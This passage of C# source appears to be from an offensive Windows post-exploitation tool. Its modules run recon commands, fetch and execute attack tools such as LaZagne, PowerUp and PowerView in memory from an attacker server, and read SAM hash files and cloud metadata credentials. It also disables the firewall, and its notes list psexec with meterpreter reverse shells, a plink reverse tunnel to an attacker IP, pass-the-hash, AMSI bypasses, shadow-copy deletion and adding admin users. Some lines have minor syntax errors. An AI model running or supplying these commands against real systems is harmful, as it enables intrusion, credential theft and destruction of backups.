            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_all_running_services_sc";
            title = "Get a list of all running services via sc";
            command = "sc qc state=all";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_running_services_tasklist";
            title = "Get a list of all running services via tasklist";
            command = "tasklist /SVC";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_all_running_services_wmic";
            title = "Get a list of all running services via wmic";
            command = "wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName,State | findstr /I running";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_service_hijacking_unquoted_bin_paths";
            title = "Check for services with possibly unquoted paths when they contain space - could be vulnerable to hijacking. Check if the output has any unquoted paths?";
            command = @"wmic service get name,displayname,pathname,startmode,state |findstr /i ""Auto"" | findstr /i /v ""C:\\Windows""";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_well_known_vulns_watson";
            title = "Get well-known vulns through Rasta-mouse's Watson'";
            binaryName = "Watson.exe";
            serverPath = "/Watson.exe";
            parameters = "";
            output += executeDotNetBinaryInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, 
    				               serverPort, serverPath, binaryName, parameters);

            moduleId = "win_auto_recon_priv_esc_dropboxupdater";
            title = "Look for dropbox updater service and Log folder, which is known to lead to privilege escalation vulnerabilities via hard-links. Taken from: https://decoder.cloud/2019/12/18/from-dropboxupdater-to-nt-authoritysystem/";
            command = @"tasklist | findstr /I ""dropboxupdate"";" +
                      @"dir /b /s C:\ProgramData\Dropbox\Update\Log";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_writable_path_env_var_check";
            title = "Get the path variable, and check if any of the paths are world writable";
            command = "echo %PATH%";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
                           
            moduleId = "win_auto_recon_well_known_vulns_sherlock";
            title = "Get well-known vulns through Rasta-mouse's Sherlock";
            serverPath = "/Sherlock.ps1";
            powershellCmd = "Find-AllVulns";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_well_known_misconfigs_powershell_powerup";
            title = "Get well-known windows misconfigurations through HarmJ0y's Powersploit/PowerUp";
            serverPath = "/PowerUp.ps1";
            powershellCmd = "Invoke-AllChecks";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
                                                   powershellCmd);
    
            moduleId = "win_auto_recon_symantec_endpoint_scanning_exemptions";
            title = "Get Symantec Endpoint Scanning AV Exemptions - SEP Policy Exceptions for bypassing anti-virus. Taken from: https://twitter.com/_nullbind/status/1204416107060191238?s=20";
            regPath = @"HKLM\SOFTWARE\WOW6432Node\Symantec\""Symantec Endpoint Protection""\AV\Exclusion\ScanningEngines";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath);

            moduleId = "win_auto_recon_get_exchange_server_version_powershell_powershell";
            title = "Get the version of Windows Exchange installed on the system";
            command = @"Get-ExchangeServer | Format-List";
            notes = @"
                # Powershell Technique Taken from: 
                    https://stackoverflow.com/questions/15271795/how-to-detect-which-version-of-exchange-is-installed-in-the-target-server-in-c

                # CVE-2020-0688
                Is it vulnerable to CVE-2020-0688 - see here: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
                If patches installed (4536987,4536988, 4536989), then not affected

                ## Exploit available @ https://github.com/zcgonvh/CVE-2020-0688";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_hp_system_event_utility_cve_2019_18915";
            title = "HP System Event Utility - Local Privilege Escalation (CVE-2019-18915). Exploit @ https://www.exploit-db.com/exploits/48057";
            command = @"dir /b /s C:\ | findstr /I /C:""HPMSGSVC.exe"";" +
                      @"dir /b /s C:\ | findstr /I /C:""SmrtAdptr.exe""";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_gigabyte_atillk_sys_cve_2020_1066_dir";
            title = "Determine the .NET Version for CVE-2020-1066 - are we actually using a vulnerable .NET version?";
            command = @"dir /b /ad /o-n %systemroot%\Microsoft.NET\Framework\v?.*";
            notes = @"
                Affects Windows .NET Framework Service Pack 3.0 on Windows 2008

                Affects Microsoft .NET Framework 3.5.1 on Windows 7

                Exploit available @ https://twitter.com/piedpiper1616/status/1267367145270161414?s=20
            "
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_gigabyte_atillk_sys_cve_2020_1066_wmic";
            title = "Determine the .NET Version for CVE-2020-1066 - are we actually using a vulnerable .NET version?";
            command = @"wmic product get description | findstr /C:"".NET Framework""";
            notes = @"
                Affects Windows .NET Framework Service Pack 3.0 on Windows 2008
                Affects Microsoft .NET Framework 3.5.1 on Windows 7
                Exploit available @ https://twitter.com/piedpiper1616/status/1267367145270161414?s=20
            "
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_gigabyte_atillk_sys_cve_2020_12138_dir";
            title = "Gigabyte Fusion 2.0 drivers vulnerability";
            command = @"dir /b /s C:\""Program Files (x86)""\GIGABYTE\RGBFusion\AtiTool\atillk64.sys";
            notes = "If the file is present, then it could be vulnerable. Exploit PoC available @ https://h0mbre.github.io/atillk64_exploit/#";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_ea_origin_win_priv_esc_smb_version_in_use_eternalblue_ms17_010_cve_2017_0144_smbv1";
            title = "Determine versions of SMB in use as this could lead to EternalBlue (CVE-2017-0144 - SMBv1)";
            regPath = @"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters";
            notes = @"If SMB1 set to 1 or not shown, then SMBv1 is enabled. Could potentially be vulnerable to EternalBlue (SMBv1 - CVE-2017-0144) Wannacry vulnerability
                      If SMB2 shown and set to 1, or not shown, then SMB2 is enabled.

                      see: https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3 for more details";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                manualTask: notes);

            moduleId = "win_auto_recon_ea_origin_win_priv_esc_smb_version_in_use_smbv3_smbghost_cve_2020_0796";
            title = "Determine versions of SMB in use for Windows servers as this could lead to SMBGhost (CVE-2020-0796 - SMBv3)";
            command = "Get-SmbServerConfiguration; Get-SmbConnection";
            notes = @"If SMBv3 set then it will show up in output for these commands.

                      See: https://docs.microsoft.com/en-us/powershell/module/smbshare/get-smbconnection?view=win10-ps.
                      See: Exploit @ https://github.com/danigargu/CVE-2020-0796";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_ea_origin_win_priv_esc_cve_2019_19248";
            title = "EA's Origin Web Helper Service Vulnerability - CVE-2019-19248. Taken from: https://enigma0x3.net/2019/12/10/cve-2019-19248-local-privilege-escalation-in-eas-origin-client/";
            command = @"sc qc | findstr /I ""Origin Web Helper Service""";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_ea_origin_win_priv_esc_cve_2019_19248";
            title = "EA's Origin Web Helper Service Vulnerability - CVE-2019-19248 - search for \"Origin Client Servicet\". Taken from: https://enigma0x3.net/2019/12/10/cve-2019-19248-local-privilege-escalation-in-eas-origin-client/";
            command = "sc qc | findstr /I \"Origin Client Service\"";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_ricoh_win_priv_esc_cve_2019_19363";
            title = "Ricoh's Print Drivers Privilege Escalation detected via \"PrintIsolationHost.exe\" file OR presence of the \"RICOH_DRV\" directory...";
            command = @"dir /b /s C:\Windows\System32 | findstr /I ""PrintIsolationHost.exe"";" + 
                      @"dir /b /s C:\ProgramData\RICOH_DRV";
            refs = "Exploit @ https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/ and https://www.exploit-db.com/exploits/48036";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_env_vars_set";
            title = "Get the envirionment variables in the current user profile via 'set' command";
            command = @"set";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_creds_reg";
            title = "Get the registry key value that stores the LAPS encoded password";
            command = @"reg query ""HKLM\Software\Policies\Microsoft Services\AdmPwd"" /v AdmPwdEnabled";
            notes = @"
            LAPS allows you to manage the local Administrator password 
            (which is randomised, unique, and changed regularly) on domain-joined
            computers. These passwords are centrally stored in Active Directory 
            and restricted to authorised users using ACLs. Passwords protected
            in transit from the client to the server using Kerberos v5 and AES.
            Taken from: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, 
                manualTasks: notes);

            moduleId = "win_auto_recon_audit_events_logged_reg";
            title = "Check the audit events logged via reg";
            regPath = @"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit";
            notes = @"These settings decide what is being logged, so you should pay attention.
            Taken from: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                   manualTask: notes);
            
            moduleId = "win_auto_recon_win_event_forwarding_logs_reg";
            title = "Check Windows Event Forwarding logs via reg";
            regPath = @"HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager";
            notes = @"Windows Event Forwarding, is interesting to know where are the logs sent
                Taken from: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                   manualTask: notes);
            
            moduleId = "win_auto_recon_get_clipboard_info_powershell";
            title = "Get the clipboard content via powershell";
            command = "Get-Clipboard";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_env_vars_wmic";
            title = "Get the envirionment variables in the current user profile via 'wmic' command";
            command = @"wmic environment get Description, VariableValue";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_env_vars_get_childitem_powershell";
            title = "Get the envirionment variables via powershell";
            command = @"Get-ChildItem Env: | ft Key,Value";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_extraction_lazagne";
            title = "Extract credentials via Lazagne on the device";
            binaryName = "lazagne-2.4.3.exe";
            serverPath = "/lazagne/lazagne-2.4.3.exe";                                                             
            parameters = "all";
            notes = "Taken from Github: https://github.com/AlessandroZ/LaZagne/releases";
            output += downloadExecuteBinary(modulesToExec, modulesToNotExec, moduleId, title, serverIp,
                                            serverPort, serverPath, binaryName,                     
                                            parameters);
               
            moduleId = "win_auto_recon_creds_hashes_sam";
            title = "Credentials Hashes - SAM file - User & Password hashes file";
            command = @"type %SYSTEMROOT%\system32\config\SAM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_hashes_repair_file_sam";
            title = "Credentials Hashes - SAM file - Repair file";
            command = @"type %SYSTEMROOT%\repair\SAM";
            refs = "RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_hashes_regback_sam";
            title = "Credentials Hashes - SAM, Regback file";
            command = @"type %SYSTEMROOT%\System32\config\RegBack\SAM";
            refs = "RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_creds_internet_explorer_history_dir";
            title = "Get the Internet Explorer history via the browser from dir";
            command = @"dir C:\Users\%USERNAME%\AppData\Local\Google\Chrome\""User Data""\Default\History; " +
                 "dir C:\Users\%USERNAME%\Favorites; " + 
                 "dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache; " + 
                 "dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Internet Explorer\Recovery";
            notes = @"
                Taken from: Forensics Wiki

                This is a SQLITE3 file if found to be viewed via a browser";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_creds_jabber_client_dir";
            title = "Steal the Cisco Jabber Client Credentials. May require additional work to decode.";
            command = @"dir %AppData%\Roaming\Cisco\""Unified Communications""\Jabber\CSF\Credentials";
            notes = @"
                Taken from: https://community.cisco.com/t5/collaboration-applications/where-does-jabber-save-the-login-credential/td-p/3890987";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_creds_google_chrome_history_dir";
            title = "Get the Google Chrome history file via the dir command. May need additional decoding.";
            command = @"dir C:\Users\%USERNAME%\AppData\Local\Google\Chrome\""User Data""\Default\History";
            notes = @"
                Taken from: Forensics Wiki";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);


            moduleId = "win_auto_recon_creds_outlook_emails_pst_dir";
            title = @"Check if there is an Outlook Emails PST file which contains emails and can contain creds from dir";
            command = @"dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Outlook";
            notes = @"
                Taken from: Forensics Wiki

                This is a SQLITE3 file if found to be viewed via a browser";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);
            
            moduleId = "win_auto_recon_creds_wireless_wlan_profiles_netsh";
            title = @"Check if Wireless creds can be  accessed via 'netsh' wlan";
            command = @"netsh wlan show profiles";
            notes = @"
                # Attempt to get credentials for each wireless LAN network/SSID 
                    netsh wlan show profile <PROFILENAME> key=clear
            ";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_vss_shadow_copies_backup_vssadmin";
            title = @"Get a list of all shadow copy backups via vssadmin";
            command = @"vssadmin list shadows";
            notes = "Note: may require UAC bypass (Admin account with high integrity label to execute)";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, 
                                      manualTask: notes);

            moduleId = "win_auto_recon_check_app_events_logfile";
            title = "Check if AppEvent.Evt Events logfile is available";
            command = @"dir %WINDIR%\system32\config\AppEvent.Evt";
            refs = "RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_check_sec_events_logfile";
            title = "Check if SecEvent.Evt Events logfile is available";
            command = @"dir %WINDIR%\system32\config\SecEvent.Evt";
            refs = "RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_aws_glue_endpoint_powershell";
            title = "Get the AWS Glue IAM creds via the AWS metadata using 'powershell' assuming we are on a glue endpoint which is like an EC2 instance";
            url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy";
            notes = @"Taken from Rhino Labs post on Twitter: https://twitter.com/SpenGietz/status/1030099156012953600";
            output += executeWebRequestInMem(modulesToExec, modulesToNotExec, moduleId, title, url, 
                                   manualTask: notes);

            moduleId = "win_auto_recon_aws_lambda_input_event_powershell";
            title = "Get the AWS Lambda input event";
            url = "http://localhost:9001/2018-06-01/runtime/invocation/next";
            notes = @"Taken from Rhino Labs post on Twitter: https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/lambda_ssrf";
            output += executeWebRequestInMem(modulesToExec, modulesToNotExec, moduleId, title, url, 
                                   manualTask: notes);

            moduleId = "win_auto_recon_scanner_hostenum_powershell_script"; 
            title = "Check if AVs are running on the PC via HostEnum powershell script";
            serverPath = "/HostEnum/HostEnum.ps1";
            powershellCmd = "Invoke-HostEnum -Verbose -All";
            notes = @"Taken from: 
                        https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title,
                                                   serverIp, serverPort, serverPath,
                                                   powershellCmd);

            moduleId = "win_auto_recon_find_passwords_in_registry_reg";
            title = "Locate passwords in registry via the 'reg' command";
            command = "reg query HKLM /f password /t REG_SZ /s";
            refs = "RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_rdp_status_reg";
            title = "Check the RDP status via reg";
            regPath = @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\""Terminal Server""";
            regValueName = "fDenyTSConnections";
            notes = "If the registry key is visible and set to 0, then it means that RDP is enabled";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                   regValueName, manualTask: notes);

            moduleId = "win_auto_recon_get_rdp_status_rdp_network_port_netstat";
            title = "Locate RDP server connections via netstat";
            command = "netstat -aonb | findstr /I 3389";
            notes = "Check if RDP is running via netstat command - port 3389";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);
            
            moduleId = "win_auto_recon_get_server_managed_windows_features_powershell";
            title = "Get Windows Server Features enabled on the server via Get-Windows Feature powershell cmd - e.g. is DNS admin enabled which could be interesting?";
            command = "Get-WindowsFeature";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_server_managed_windows_features_dism";
            title = "Get Windows Server Features enabled on the server via dism - e.g. is DNS admin enabled which could be interesting?";
            command = "dism.exe /online /Get-Features";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_exploit_rdp_enable_multiple_sessions_per_user_regedit";
            title ="Enable Multiple sessions per user itself by editing the registry key using powershell";
            regPath = @"HKLM\SYSTEM\CurrentControlSet\Control\""Terminal Server""";
            regValueName = "fSingleSessionPerUser";
            regValueData = "0";
            regValueType = "REG_DWORD";
            output += addRegValue(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                  regValueName, regValueData, regValueType);

            moduleId = "win_auto_exploit_disable_firewall_netsh";                             
            title = "Disable the Firewall via netsh";                           
            command = "netsh advfirewall set allprofiles state off";                                    
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command); 

            moduleId = "win_auto_recon_domain_trust_relationships_activedirectory_module_powershell";
            title = "Find any other domains connected to this domain via ActiveDirectory module in powershell";
            command = @"([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command); 

            moduleId = "win_auto_recon_domain_trust_relationships_powersploit_powershell";
            title = "Find any other domains connected to this domain via ActiveDirectory module in powershell (Get-NetDomainTrust)";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetDomainTrust";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
                               powershellCmd);

            moduleId = "win_auto_recon_domain_trust_relationships_nltest";
            title = "Find any other domains connected to this domain via ActiveDirectory module in nltest";
            command = "nltest /domain_trusts"
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command); 

            moduleId = "win_auto_recon_domain_trust_relationships_powersploit_powershell";
            title = "Find any other forests connected to this domain via ActiveDirectory module in powershell (Get-NetForestTrust)";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetForestTrust";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
                               powershellCmd);

            moduleId = "win_auto_recon_domain_trust_relationships_activedirectory_module_powershell";
            title = "Find any other domains connected to this domain via ActiveDirectory module in powershell";
            command = @"([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()";
            notes = @"# Taken from:https://ired.team/offensive-security-experiments/offensive-security-cheetsheets"
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_forest_activedirectory_powershell";
            title = "Get the information about AD forest";
            command = @"[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_list_docker_containers_docker";
            title = "Get the list of all docker containers via docker command";
            command = @"docker container ls -a";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_manual_exploit_lateral_movt_pivot_psexec";
            title = "Attempt to re-use creds for an existing machine for psexec";
            notes = @"
                # Transfer PSExec locally to a PC e.g. via covenant/Metasploit C2
                psexec -accepteula  -u <username> -p <password> <reverse-shell-path-generated-via-meterpreter-eg-windows_x64_meterpreter_reverse_tcp.exe>

                # To execute a C2 
                psexec.exe -accepteula -u <shared-username> -p <shared-password> C:\Windows\Temp\.system\windows_x64_meterpreter_reverse_tcp.exe
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_exploit_lateral_movt_pivot_runas";
            title = "Attempt to run as a different user via runas";
            notes = @"
                # Execute the command where <username> is the different user: 
                runas /user:<username> cmd.exe 
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_get_log_entries_wevtutil";
            title = "Get interesting log entries via wevtutil - any interesting applications? or logged-in usernames?";
            notes = @"
                # Run the command: 
                wevtutil qe security /f:text
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_get_network_connections_network_miner";
            title = "View list of open Network Connections";
            notes = @"
                - Install 'Network Miner' to see passwords, traffic?
                - Or, View process and kill the actual process - use 'ncat' to listen to traffic.
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_discover_passwords_findstr";
            title = "Discover passwords one-by-one through 'findstr' search";
            notes = @"Run the following commands:
                        findstr /si password C:\\*.txt
                        findstr /si password C:\\*.xml
                        findstr /si password C:\\*.xls
                        findstr /si password C:\\*.xlsx
                        findstr /si password C:\\*
                        findstr /si secret C:\\*.txt
                        findstr /si secret C:\\*.xml
                        findstr /si secret C:\\*.xls
                        findstr /si secret C:\\*.xlsx
                        findstr /si secret C:\\*";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_av_detection_discover_registry_keys_reg";
            title = "Discover AVs by exporting registry keys for exporting the HKLM registry key to a text file";
            notes = @"
                # Export the registry key:
                    reg export HKLM hklm.txt

                # Download the file via Covenant Task: DownloadFile
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);


            moduleId = "win_manual_recon_get_other_assets_in_domain_netdom";
            title = "Get other assets such as servers, workstations, PDCs, OU as well via the 'netdom' command";
            notes = @"
                netdom query /domain:<domain> server
                netdom query /domain:<domain> workstation
                netdom query /domain:<domain> ou
                netdom query /domain:<domain> pdc
                netdom query /domain:<domain> trust";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_get_domain_controllers_nltest";
            title = "Get the domain controllers for domain: <domain>";
            notes = "nltest /dclist:<domain>";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_recon_get_domain_controllers_netdom";
            title = "Get Domain controllers via 'netdom query' command";
            notes = "netdom query /domain:<domain-name> dc";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_exploit_enable_rdp_for_attacker_reg_powershell";
            title = "Enable RDP for attacker assuming that RDP is enabled on this victim";
            notes = @"
                # Enable RDP via registry

                ## Via 'reg' command
                reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f

                ## Via 'powershell' command
                
                ## Via metasploit
                use post/windows/manage/enable_rdp; set session 2; exploit
                
                ### Taken from: https://www.hackingarticles.in/penetration-testing-remote-desktop-port-3389/

                ### Add the fDenyTSConnections registry value to 0
                powershell.exe get-ItemProperty HKLM:\System\CurrentControlSet\Control\""Terminal Server"" and check for fDenyTSConnections is set to 0 (for enabled.)
                
                # Modify firewall via netsh command to allow RDP
                netsh firewall set service type = remotedesktop mode = enable

                # Also, have to display authentication, otherwise rdesktop shows auth credssp auth failure 
                reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f

                # Taken from:
                https://help.appveyor.com/discussions/problems/3281-rdesktop-on-linux-requires-credssp               
                    
                # Then add the user to 'Remote Desktop Users' group 
                    net users ""Remote Desktop Users"" <username> /add
            ";
            refs = @"
                # Taken from: https://github.com/rasta-mouse/AmsiScanBufferBypass";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, 
                                 isManualTask: true);

            moduleId = "win_manual_exploit_make_all_files_editable_icacls";
            title = "Make ALL files editable using 'icacls';
            notes = @"
                # Run the following shell command to grant Everyone write access
                on all files:
                    icacls ""C:\*"" /grant Everyone: F /T /C /Q

                # Run following shell command to edit the file, <file-to-edit>:
                    icacls ""<file-to-edit>"" /grant Everyone: F /T /C /Q
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, 
                                 isManualTask: true);

            moduleId = "win_manual_exploit_delete_shadow_copies_vssadmin";
            title = "Delete Shadow Copies via VssAdmin";
            notes = @"
                # Delete all the shadow copies via VssAdmin - dangerous. Do not 
                execute. 
                vssadmin.exe Delete Shadows /all /quiet
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, 
                                 isManualTask: true);

            moduleId = "win_manual_exploit_delete_shadow_copies_wmic";
            title = "Delete Shadow Copies via wmic";
            notes = @"
                # Delete all the shadow copies via VssAdmin - dangerous. Do not 
                execute. 
                wmic shadowcopy delete
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, 
                                 isManualTask: true);

            moduleId = "win_manual_recon_access_rdp_port_from_victim_plink";
            title = "Access RDP port via Plink from Victim PC";
            notes = @"
                # is rdp running?
                netstat -aonb | find 3389  

                # upload plink via meterpreter 

                # deploy a binary of plink (ssh) to transfer between ports 3389  
                plink -N -R 3389:127.0.0.1:3389 <attacker-ip>

                # connect via rdesktop - add quotes around password to connvect via SSH
                rdesktop -u myadmin -p ""myadmin"" <victim-ip>
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_manual_exploit_lateral_movt_rdp_pass_the_hash_win_server_2012_xfreerdp";
            title = "Perform pass-the-hash for 'Restricted Admins' in Windows server 2012";
            notes = @"
                # Compromised hash: test:1001:NO PASSWORD*********************:36374BD2767773A2DD4F6B010EC5EE0D:::

                # Attempt pass-the-hash for a username with NTLM hash above - if test
                 xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D <victim>
            ";
            refs = @"Taken from:
                    https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/"
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs,
                                isManualTask: true);


            moduleId = "win_manual_exploit_powershell_av_bypass_amsi_scan_buffer_bypass";
            title = "Attempt to bypass AMSI via AmsiScanBufferBypass";
            notes = @"
                    
                    # Via powershell: 
                        .\ASBBypass.ps1
                    
                    # Via C#
                        via C#
                            - first compile to .dll file and then load the .dll assembly

                            [System.Reflection.Assembly]::LoadFile(""D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll"")
                            [Amsi]::Bypass()
                    
                    # Attempt to transfer file using powershell-shell or test via 'Get-Process'
            ";
            refs = @"
                # Taken from: https://github.com/rasta-mouse/AmsiScanBufferBypass";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, 
                                 isManualTask: true);

            moduleId = "win_manual_exploit_powershell_av_bypass_amsi_scan_bypass_powershell_version_2";
            title = "Attempt to bypass AMSI via Powershell version 2.0";
            notes = @"
                        powershell  -version 2.0 -ep bypass '<powershell script to execute>'

                    # Attempt to transfer file using powershell-shell or test via 'Get-Process'
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, isManualTask: true);

            moduleId = "win_manual_exploit_powershell_pull_password_policy";
            title = "Pull Password policy via Get-ADDefaultDomainPasswordPolicy";
            notes = "Launch Powershell via mmc: runas /netonly /user:mydomain\\ops mmc \n" + 
                    "Get-ADDefaultDomainPasswordPolicy -Server 127.0.0.1";
            refs = "https://www.attackdebris.com/?p=470";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);

            moduleId = "win_manual_exploit_create_new_user_net";
            title = "Add a new user with the specific username/password using the 'net' command";
            notes = "Run the following command:\n" + 
                    "    net user <username> <password> /add";
            refs = "Red Team Field Manual - Windows Net/Domain Commands";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, isManualTask: true);

            moduleId = "win_manual_exploit_add_new_user_to_local_admin_net";
            title = "Add the user as a local administrator with 'net' command";
            notes = "Run the following command:\n" + 
                    "    net localgroup \"Administrators\" <username> /add";
            refs = "Red Team Field Manual - Windows Net/Domain Commands";
